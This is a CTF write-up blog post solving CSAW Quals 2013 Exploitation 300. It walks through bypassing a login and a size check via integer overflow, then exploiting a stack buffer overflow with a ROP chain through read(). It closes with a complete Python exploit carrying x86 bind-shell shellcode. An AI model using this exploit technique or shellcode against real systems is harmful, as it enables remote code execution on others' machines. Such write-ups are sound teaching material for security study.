---
title: CSAW CTF Quals 2013 Exploitation 300 writeup
author: Adrian
layout: post
permalink: /csaw-ctf-quals-2013-exp300-writeup/
categories:
  - CTF
  - writeup
---

That is a network service. I can connect it by netcat. then i must input **username** **password** and seomething else.

![1]

After i analysis the service. I find out the process of login and i find the **username** and **password**

![2] ![3] ![4]

Then I input username and password. I input a number(**size**) and a string(**buff**). 

"size" > 1 and "size" + 1 < 0x400

![5]

Then I input The buff and the buff must ASCII Characters.

last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.

there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. 

`
0xffff + 1 == ； 0 0xffff == 65535
`

now we can input any string which we want :)

then i will write the exp.

`
'A' * 0x420 + ret_address
`
there is not "jmp esp" in program when i use objdump. but the program use the function of read. i can use **read** to write "jmp esp" in static area.

read(fd, buff, buffsize)

read: call   80486e0 <read@plt> 

fd:4 (the fd of client socket)

read( 4, *0x080486e0, 2)

now the send "jmp esp" and the program will write in memory.

`
'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
`

now I did it.use the exp and use **nc** connect remote server.

![6]

![7]

##Exp

~~~
import sys, os, time, struct, socket

def p32(addr):
    return struct.pack("<I", addr)

def r(s, t=0.1):
    time.sleep(t)
    return s.recv(8192)

def se(s, buf):
    s.send(buf)

HOST = "128.238.66.217"
HOST = "192.168.1.180"
PORT = 34266

SHELLCODE = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" +\
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" +\
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" +\
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" +\
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" +\
"\x0b\xcd\x80"

s = socket.socket()
s.connect((HOST, PORT))

print r(s)
se(s, "csaw2013")
print r(s)

se(s, "S1mplePWD")
print r(s)
se(s, "65535")
read = p32(0x80486e0)
pop3ret = p32(0x8049110)
static = p32(0x804b000)
fd = p32(4)
jmpesp = "\xff\xe4"
buf = "A" * (1056 + 0)
buf = "A" * 0x420
buf += read + pop3ret + fd + static + p32(2) + static + "\x90" * 100 + SHELLCODE
se(s, buf)
time.sleep(5)
se(s, jmpesp)
print 'OK!!!'
~~~
{:lang="python"}


 [1]: http://www.blue-lotus.net/images/2013/nclogin.png
 [2]: http://www.blue-lotus.net/images/2013/username.png
 [3]: http://www.blue-lotus.net/images/2013/password.png
 [4]: http://www.blue-lotus.net/images/2013/dbup.png
 [5]: http://www.blue-lotus.net/images/2013/size.png
 [6]: http://www.blue-lotus.net/images/2013/exp.png
 [7]: http://www.blue-lotus.net/images/2013/remote.png
